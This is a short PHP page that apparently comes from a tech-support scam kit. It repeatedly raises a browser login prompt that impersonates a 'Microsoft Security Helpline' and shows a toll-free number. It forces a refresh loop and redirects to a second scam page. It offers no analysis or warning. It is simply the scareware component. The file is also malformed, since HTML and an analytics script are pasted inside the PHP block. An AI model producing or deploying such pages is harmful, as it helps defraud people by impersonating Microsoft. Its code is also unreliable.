<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';

    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 70;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: Hsdelpcxxxcoded2.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="*** Microsoft_Security_Helpline +1-833-793-3086    (Toll_Free). *** "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: Hsdelpcxxxcoded2.php');

        exit;
    }
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-208169927-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-208169927-1');
</script>


?>
